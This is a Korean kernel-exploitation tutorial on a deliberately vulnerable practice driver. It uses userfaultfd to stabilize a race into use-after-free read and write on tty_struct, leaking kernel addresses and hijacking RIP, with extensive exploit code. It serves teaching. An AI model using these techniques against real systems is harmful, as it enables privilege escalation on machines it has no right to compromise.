---
title: userfaultfd의 사용
tags:
    - [Linux]
    - [Kernel]
    - [Race Condition]
    - [Data Race]
    - [userfaultfd]
lang: kr
permalink: /kr/linux-kernel/LK04/uffd.html
pagination: true
fd: fuse.html
bk: ../LK03/double_fetch.html
---
LK04(Fleckvieh)에서는 LK01-4(Holstein v4)에서 다뤘던 것과 비슷한 Race Condition을 더 까다로운 조건에서 다룹니다. 먼저 [연습문제 LK04](distfiles/LK04.tar.gz) 파일을 다운로드하세요.

## 드라이버 확인
먼저 드라이버 소스 코드를 읽어 봅시다. 이번 드라이버는 이전 것보다 양이 많고, 지금까지 등장하지 않았던 기능과 문법도 있습니다. `module_open`은 다음과 같습니다.
```c
static int module_open(struct inode *inode, struct file *filp) {
  /* Allocate list head */
  filp->private_data = (void*)kmalloc(sizeof(struct list_head), GFP_KERNEL);
  if (unlikely(!filp->private_data))
    return -ENOMEM;

  INIT_LIST_HEAD((struct list_head*)filp->private_data);
  return 0;
}
```
먼저 4번째 줄의 `unlikely` 매크로에 주목합시다. 이것은 Linux 커널에서 [다음처럼 정의되며](https://elixir.bootlin.com/linux/v5.16.14/source/include/linux/compiler.h#L77), 매우 자주 등장합니다.
```c
#define likely(x)      __builtin_expect(!!(x), 1)
#define unlikely(x)    __builtin_expect(!!(x), 0)
```
보안 검사나 메모리 부족 같은, 대부분 한쪽 분기만 타는 조건문에서 어느 쪽이 더 자주 실행되는지 컴파일러에 알려 주는 용도입니다. 예측이 맞으면 자주 실행되는 경로의 성능이 좋아질 수 있습니다.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_suyasuya.png" alt="늑대" ></div>
  <p class="says">
    컴파일러에 힌트를 주면 자주 지나가는 경로의 명령 수나 분기 수를 줄여 줄 수 있어.
    이런 이야기는 CPU 분기 예측과도 관련 있으니까 궁금하면 더 찾아봐.
  </p>
</div>

다음으로 7번째 줄의 `INIT_LIST_HEAD` 매크로는 `tty_struct` 등에서 봤던 이중 연결 리스트 `list_head` 구조체를 초기화하는 매크로입니다. 각 파일 open마다 이중 연결 리스트를 만들기 위해 `private_data`에 이 구조체를 넣고 있습니다.
이 리스트에는 `blob_list` 구조체가 연결됩니다.
```c
typedef struct {
  int id;
  size_t size;
  char *data;
  struct list_head list;
} blob_list;
```
리스트에 아이템을 추가할 때는 `list_add`, 삭제할 때는 `list_del`, 순회할 때는 `list_for_each_entry(_safe)` 같은 매크로를 사용합니다. 자세한 사용법은 필요할 때 찾아보면 됩니다.

`ioctl` 구현을 보면 이 모듈에는 `CMD_ADD`, `CMD_DEL`, `CMD_GET`, `CMD_SET` 네 가지 연산이 있다는 것을 알 수 있습니다.
```c
static long module_ioctl(struct file *filp,
                         unsigned int cmd,
                         unsigned long arg) {
  struct list_head *top;
  request_t req;
  if (unlikely(copy_from_user(&req, (void*)arg, sizeof(req))))
    return -EINVAL;

  top = (struct list_head*)filp->private_data;

  switch (cmd) {
    case CMD_ADD: return blob_add(top, &req);
    case CMD_DEL: return blob_del(top, &req);
    case CMD_GET: return blob_get(top, &req);
    case CMD_SET: return blob_set(top, &req);
    default: return -EINVAL;
  }
}
```
`CMD_ADD`는 리스트에 `blob_list`를 추가합니다. 각 `blob_list`는 최대 0x1000바이트의 데이터를 가지며, 내용은 사용자가 임의로 넣을 수 있습니다. 추가 시에는 랜덤한 ID가 부여되고, 이 값이 `ioctl` 반환값으로 사용자에게 전달됩니다. 이후 사용자는 이 ID를 이용해 해당 `blob_list`를 조작합니다.
`CMD_DEL`은 ID를 전달하면 대응하는 `blob_list`를 리스트에서 삭제합니다.
`CMD_GET`은 ID와 버퍼, 크기를 지정해 해당 `blob_list`의 데이터를 사용자 공간으로 복사합니다.
마지막으로 `CMD_SET`은 ID와 버퍼, 크기를 지정해 사용자 공간의 데이터를 해당 `blob_list`에 복사합니다.

이전 모듈들과 마찬가지로 데이터를 저장하는 기능이지만, Fleckvieh는 리스트로 데이터를 관리하므로 여러 개를 저장할 수 있습니다.

## 취약점 확인
LK01을 모두 공부했다면 취약점은 금방 보일 것입니다. 어디에도 락이 없기 때문에 데이터 경쟁이 쉽게 발생합니다. 하지만 이 경쟁을 exploit하려고 하면 문제가 생깁니다.
데이터를 이중 연결 리스트라는 비교적 복잡한 구조로 관리하고 있기 때문에, 삭제되는 타이밍에 맞춰 데이터를 읽거나 쓰려고 하면 unlink 과정 자체와 충돌할 수 있고, 그 결과 링크나 커널 힙 상태가 망가집니다. 그러면 race 도중 크래시가 나거나, Use-after-Free를 정말 만들었는지 판정하기 어렵습니다.
직접 race 코드를 써서 확인해 봅시다.
```c
int fd;

int add(char *data, size_t size) {
  request_t req = { .size = size, .data = data };
  return ioctl(fd, CMD_ADD, &req);
}
int del(int id) {
  request_t req = { .id = id };
  return ioctl(fd, CMD_DEL, &req);
}
int get(int id, char *data, size_t size) {
  request_t req = { .id = id, .size = size, .data = data };
  return ioctl(fd, CMD_GET, &req);
}
int set(int id, char *data, size_t size) {
  request_t req = { .id = id, .size = size, .data = data };
  return ioctl(fd, CMD_SET, &req);
}

int race_win;

void *race(void *arg) {
  int id;
  while (!race_win) {
    id = add("Hello", 6);
    del(id);
  }
}

int main() {
  fd = open("/dev/fleckvieh", O_RDWR);
  if (fd == -1) fatal("/dev/fleckvieh");

  race_win = 0;

  pthread_t th;
  pthread_create(&th, NULL, race, NULL);

  int id;
  for (int i = 0; i < 0x1000; i++) {
    id = add("Hello", 6);
    del(id);
  }
  race_win = 1;
  pthread_join(th, NULL);

  close(fd);
  return 0;
}
```
이 코드는 여러 스레드에서 데이터를 추가하고 삭제하는 작업을 반복합니다. 경쟁이 발생하면 이중 연결 리스트 링크가 깨지기 때문에, 마지막 `close`에서 리스트 내용을 해제하는 시점에 크래시가 납니다.

그렇다면 이런 복잡한 데이터 구조에서의 race는 exploit할 수 없는 걸까요?

## userfaultfd란?
이번처럼 조건이 복잡한 race를 exploit하거나, race 성공 확률을 거의 100%까지 끌어올리기 위해 `userfaultfd`라는 기능을 악용하는 방법이 있습니다.

Linux를 `CONFIG_USERFAULTFD`와 함께 빌드하면 **userfaultfd**라는 기능을 사용할 수 있습니다. userfaultfd는 사용자 공간에서 페이지 폴트를 처리하기 위한 시스템 콜입니다.

`CAP_SYS_PTRACE`가 없는 사용자가 userfaultfd를 완전 권한으로 사용하려면 `unprivileged_userfaultfd` 플래그가 1이어야 합니다. 이 값은 `/proc/sys/vm/unprivileged_userfaultfd`에서 확인하거나 바꿀 수 있습니다. 기본값은 0이지만, LK04 머신에서는 1로 설정되어 있습니다.

사용자는 `userfaultfd` 시스템 콜을 통해 파일 디스크립터를 받고, 이후 `ioctl`로 핸들러와 주소 범위를 설정합니다. 등록한 페이지에서 페이지 폴트가 발생하면(즉 첫 접근 시), 설정된 핸들러가 불리고, 사용자 공간에서 해당 페이지에 어떤 데이터를 공급할지 결정할 수 있습니다. 흐름은 다음과 같습니다.

<center>
  <img src="img/uffd.png" alt="userfaultfd 처리 흐름" style="width:720px;">
</center>

페이지 폴트가 발생하면 등록된 사용자 공간 핸들러가 실행되므로, 해당 페이지를 읽으려던 스레드는 핸들러가 데이터를 돌려줄 때까지 블록됩니다. 이 동작은 커널 공간에서 시작된 페이지 접근에도 동일하게 적용되므로, 메모리 읽기/쓰기 타이밍에 커널 실행을 멈출 수 있습니다.

## userfaultfd 사용 예시
다음 코드를 실행해 봅시다.
```c
#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

static void* fault_handler_thread(void *arg) {
  char *dummy_page;
  static struct uffd_msg msg;
  struct uffdio_copy copy;
  struct pollfd pollfd;
  long uffd;
  static int fault_cnt = 0;

  uffd = (long)arg;

  dummy_page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (dummy_page == MAP_FAILED) fatal("mmap(dummy)");

  puts("[+] fault_handler_thread: waiting for page fault...");
  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  while (poll(&pollfd, 1, -1) > 0) {
    if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
      fatal("poll");

    /* 페이지 폴트 대기 */
    if (read(uffd, &msg, sizeof(msg)) <= 0) fatal("read(uffd)");
    assert (msg.event == UFFD_EVENT_PAGEFAULT);

    printf("[+] uffd: flag=0x%llx\n", msg.arg.pagefault.flags);
    printf("[+] uffd: addr=0x%llx\n", msg.arg.pagefault.address);

    /* 요청된 페이지에 대해 반환할 데이터 선택 */
    if (fault_cnt++ == 0)
      strcpy(dummy_page, "Hello, World! (1)");
    else
      strcpy(dummy_page, "Hello, World! (2)");
    copy.src = (unsigned long)dummy_page;
    copy.dst = (unsigned long)msg.arg.pagefault.address & ~0xfff;
    copy.len = 0x1000;
    copy.mode = 0;
    copy.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &copy) == -1) fatal("ioctl(UFFDIO_COPY)");
  }

  return NULL;
}

int register_uffd(void *addr, size_t len) {
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  long uffd;
  pthread_t th;

  /* userfaultfd 생성 */
  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  if (uffd == -1) fatal("userfaultfd");

  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
    fatal("ioctl(UFFDIO_API)");

  /* 페이지 등록 */
  uffdio_register.range.start = (unsigned long)addr;
  uffdio_register.range.len = len;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
    fatal("UFFDIO_REGISTER");

  /* 페이지 폴트를 처리하는 스레드 생성 */
  if (pthread_create(&th, NULL, fault_handler_thread, (void*)uffd))
    fatal("pthread_create");

  return 0;
}

int main() {
  void *page;
  page = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE,
              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (page == MAP_FAILED) fatal("mmap");
  register_uffd(page, 0x2000);

  /* 스레드 내부 puts와 futex 때문에 주의 */
  char buf[0x100];
  strcpy(buf, (char*)(page));
  printf("0x0000: %s\n", buf);
  strcpy(buf, (char*)(page + 0x1000));
  printf("0x1000: %s\n", buf);
  strcpy(buf, (char*)(page));
  printf("0x0000: %s\n", buf);
  strcpy(buf, (char*)(page + 0x1000));
  printf("0x1000: %s\n", buf);

  getchar();
  return 0;
}
```
이 코드에서는 `register_uffd`에 페이지 주소와 userfaultfd로 감시할 길이를 넘깁니다. `register_uffd`는 페이지 폴트를 처리하는 스레드 `fault_handler_thread`를 만듭니다.
페이지 폴트가 발생하면 `fault_handler_thread` 안의 `read`가 이벤트를 받아 오고, 그 시점에 어떤 데이터를 반환할지 정합니다. 위 예제에서는 폴트 횟수에 따라 다른 문자열을 반환합니다.

`main`에서는 두 페이지를 할당[^1]하고, 그 영역에 `userfaultfd`를 설정합니다. 처음 두 번의 `strcpy`는 첫 접근이므로 페이지 폴트를 일으켜 핸들러가 실행됩니다. 아래처럼 첫 두 번에서 핸들러가 불리고, 핸들러가 돌려준 데이터가 반영되면 성공입니다.

<center>
  <img src="img/uffd_sample.png" alt="userfaultfd 사용 예시" style="width:480px;">
</center>

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_normal.png" alt="늑대" ></div>
  <p class="says">
    userfaultfd 핸들러는 별도 스레드로 동작하니까, 메인 스레드와 다른 CPU에서 실행될 수 있어.
    핸들러 안에서 객체를 할당할 때 CPU별 힙 캐시가 달라지면 UAF가 실패할 수 있으니 <code>sched_setaffinity</code>로 CPU를 고정해야 해.
  </p>
</div>

## Race 안정화
이제 실제 exploit에 `userfaultfd`를 이용해 봅시다.
`userfaultfd`를 사용하면 페이지 폴트 타이밍에 커널 공간(드라이버 코드)의 실행을 멈추고 사용자 공간으로 컨텍스트를 되돌릴 수 있습니다. 페이지 폴트는 등록한 사용자 페이지를 처음 읽거나 쓸 때 발생하므로, 이 드라이버에서는 `copy_from_user`나 `copy_to_user` 지점에서 처리를 멈출 수 있습니다. 즉 다음 위치에서 정지할 수 있습니다.

- `blob_add`의 `copy_from_user`
- `blob_get`의 `copy_to_user`
- `blob_set`의 `copy_from_user`

우리가 원하는 것은 Use-after-Free이므로, 위 함수들 중 하나에서 처리를 멈춘 사이에 `blob_del`을 호출하면 됩니다. `blob_get` 중에 삭제하면 UAF Read가, `blob_set` 중에 삭제하면 UAF Write가 만들어집니다. `tty_struct`를 대상으로 읽기/쓰기를 시도해 봅시다.
전체 흐름은 다음과 같습니다.

<center>
  <img src="img/uffd_uafr.png" alt="userfaultfd를 이용한 Use-after-Free" style="width:720px;">
</center>

`tty_struct`와 같은 크기대(`kmalloc-1024`)에서 할당한 버퍼 `victim`에 대해 `blob_get`을 호출합니다. 이때 `userfaultfd`를 설정한 주소를 넘기면, `blob_get` 내부의 `copy_to_user`에서 페이지 폴트가 발생하고 핸들러가 실행됩니다. 락이 없기 때문에 핸들러 안에서 `blob_del`을 호출할 수 있고, 그 결과 `victim`이 해제됩니다.
그다음 `tty_struct`를 spray하면 방금 해제한 `victim` 슬롯에 TTY 객체가 올라옵니다. 이후 핸들러가 복귀하면 `copy_to_user`는 여전히 원래 `victim` 주소에서 데이터를 읽어 복사하므로, 실제로는 `tty_struct` 내용이 사용자 공간으로 누출됩니다.
같은 원리로 `blob_set`을 이용하면 UAF Write도 만들 수 있습니다. 코드를 써서 확인해 봅시다.
```c
cpu_set_t pwn_cpu;

int victim;
char *buf;

static void* fault_handler_thread(void *arg) {
  static struct uffd_msg msg;
  struct uffdio_copy copy;
  struct pollfd pollfd;
  long uffd;
  static int fault_cnt = 0;

  /* 메인 스레드와 같은 CPU에서 동작 */
  if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
    fatal("sched_setaffinity");

  uffd = (long)arg;

  puts("[+] fault_handler_thread: waiting for page fault...");
  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  while (poll(&pollfd, 1, -1) > 0) {
    if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
      fatal("poll");

    /* 페이지 폴트 대기 */
    if (read(uffd, &msg, sizeof(msg)) <= 0) fatal("read(uffd)");
    assert (msg.event == UFFD_EVENT_PAGEFAULT);

    /* 요청된 페이지에 대해 돌려줄 데이터 설정 */
    switch (fault_cnt++) {
      case 0: {
        puts("[+] UAF read");
        /* [1-2] `blob_get`에 의한 페이지 폴트 */
        // victim 해제
        del(victim);

        // tty_struct를 spray해서 victim 위에 덮기
        int fds[0x10];
        for (int i = 0; i < 0x10; i++) {
          fds[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
          if (fds[i] == -1) fatal("/dev/ptmx");
        }

        // copy_to_user로 덮일 것이므로 내용은 적당해도 됨
        copy.src = (unsigned long)buf;
        break;
      }

      case 1:
        /* [2-2] `blob_set`에 의한 페이지 폴트 */
        // victim 해제
        break;
    }

    copy.dst = (unsigned long)msg.arg.pagefault.address;
    copy.len = 0x1000;
    copy.mode = 0;
    copy.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &copy) == -1) fatal("ioctl(UFFDIO_COPY)");
  }

  return NULL;
}

...

int main() {
  /* 메인 스레드와 핸들러가 반드시 같은 CPU에서 실행되게 함 */
  CPU_ZERO(&pwn_cpu);
  CPU_SET(0, &pwn_cpu);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
    fatal("sched_setaffinity");
    
  fd = open("/dev/fleckvieh", O_RDWR);
  if (fd == -1) fatal("/dev/fleckvieh");

  void *page;
  page = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE,
              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (page == MAP_FAILED) fatal("mmap");
  register_uffd(page, 0x2000);

  buf = (char*)malloc(0x400);
  victim = add(buf, 0x400);
  set(victim, "Hello", 6);

  /* [1-1] UAF Read: tty_struct 누출 */
  get(victim, page, 0x400);
  for (int i = 0; i < 0x80; i += 8) {
    printf("%02x: 0x%016lx\n", i, *(unsigned long*)(page + i));
  }

  return 0;
}
```

코드는 길지만, 앞서 그림에서 설명한 내용을 그대로 구현한 것입니다. 이 방식으로 거의 100% 확률로 Use-after-Free를 만들 수 있다는 것을 확인할 수 있습니다.

<center>
  <img src="img/test_uaf.png" alt="Use-after-Free 동작 확인" style="width:480px;">
</center>

위 그림의 누출 데이터를 보면 `tty_struct` 앞부분이 제대로 복사되지 않았다는 것을 눈치챌 수 있습니다. (`tty_operations` 등이 있어야 하는데 처음 `0x30`바이트 정도가 모두 0입니다.)
이것은 `copy_to_user`를 큰 크기로 호출했기 때문입니다. `copy_to_user`는 `victim`의 시작부터 데이터를 복사하려고 하고, 목적지 페이지에 실제로 쓰려는 순간에야 페이지 폴트가 발생합니다. 그래서 앞부분 바이트는 UAF가 발생하기 전 상태의 데이터가 복사됩니다.
다행히 `copy_to_user`는 전체 크기에 따라 내부 루프에서 한 번에 다루는 크기가 달라집니다. 따라서 예를 들어 `0x20` 같은 작은 크기로 `copy_to_user`를 호출하면, 처음 `0x10`바이트만 UAF 이전 데이터가 되고, 나머지 `0x10`바이트는 `tty_operations` 포인터를 포함해 UAF 이후 데이터가 됩니다.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_thinking.png" alt="늑대" ></div>
  <p class="says">
   어셈블리 수준에서 정확히 언제 페이지 폴트가 나는지 모르면 디버깅이 꽤 힘들겠네.
  </p>
</div>

KASLR과 힙 주소를 누출할 수 있게 되면, 같은 방식으로 UAF Write도 만들 수 있습니다.
이번에도 익숙하게 가짜 `tty_struct`의 `ops`를 가짜 함수 테이블로 향하게 만들 것이지만, 이번에 UAF가 일어나는 주소가 앞서 누출한 주소와 다를 수 있다는 점에 주의해야 합니다. 누출한 힙 주소는 `close`로 해제한 `tty_struct`의 위치에 해당하므로, 먼저 그 위치에 가짜 `tty_operation`을 spray하도록 합시다. (이번에는 `tty_operation`과 `tty_struct`를 같은 0x400 청크로 겸용합니다.)
```c
      case 2: {
        puts("[+] UAF write");
        /* [3-2] `blob_set`에 의한 페이지 폴트 */
        // 누출한 kheap 위치에 가짜 tty_operation spray
        for (int i = 0; i < 0x100; i++) {
          add(buf, 0x400);
        }

...

  /* [2-1] UAF Read: tty_struct 누출 (heap) */
  victim = add(buf, 0x400);
  get(victim, page+0x1000, 0x400);
  unsigned long kheap = *(unsigned long*)(page + 0x1038) - 0x38;
  printf("kheap = 0x%016lx\n", kheap);
  for (int i = 0; i < 0x10; i++) close(ptmx[i]);
```
누출한 주소에 가짜 함수 테이블을 준비했다면, 앞의 UAF Read와 같은 방식으로 다시 UAF를 발생시킵니다.
```c
        // victim 해제 후 tty_struct spray
        del(victim);
        for (int i = 0; i < 0x10; i++) {
          ptmx[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
          if (ptmx[i] == -1) fatal("/dev/ptmx");
        }

        // copy_from_user로 써 넣을 데이터가 담긴 버퍼
        copy.src = (unsigned long)buf;
```
이번에는 UAF Write이므로, 실제로 써 넣을 데이터를 제어해야 합니다. 그 데이터는 `copy.src`에서 오므로, 미리 가짜 `tty_struct`를 만들어 두면 됩니다.
```c
  /* [3-1] UAF Write: tty_struct 덮어쓰기 */
  memcpy(buf, page+0x1000, 0x400);
  unsigned long *tty = (unsigned long*)buf;
  tty[0] = 0x0000000100005401; // magic
  tty[2] = *(unsigned long*)(page + 0x10); // dev
  tty[3] = kheap; // ops
  tty[12] = 0xdeadbeef; // ops->ioctl
  victim = add(buf, 0x400);
  set(victim, page+0x2000, 0x400);
```
RIP가 제어되면 핵심은 끝난 것입니다. 이후 권한 상승 단계는 각자 완성해 보세요.

<center>
  <img src="img/fleck_privesc.png" alt="Fleckvieh 권한 상승" style="width:480px;">
</center>

샘플 익스플로잇 코드는 [여기](exploit/fleckvieh_uffd.c)에서 다운로드할 수 있습니다.

---

<div class="column" title="예제">
  이번에는 Race를 안정화하는 목적으로만 userfaultfd를 사용했습니다.
  하지만 데이터를 페이지 경계에 걸쳐 배치하면, 구조체의 특정 멤버를 읽거나 쓰는 시점에서 정확히 처리를 멈출 수도 있습니다.
  이런 기법이 exploit에 유용할 수 있는 상황을 생각해 봅시다.
</div>

[^1]: 첫 접근에서 페이지 폴트를 일으키고 싶기 때문에 `MAP_POPULATE`는 쓰지 않습니다.
[^2]: 여기서 `printf`를 직접 호출하면 `printf` 내부에서 다시 폴트가 나고, 핸들러 안의 `puts`/`printf`와 버퍼링이 얽혀 데드락이 날 수 있습니다. 커널 익스플로잇에서는 폴트가 커널 공간에서 발생하므로 이 문제가 덜 중요합니다.
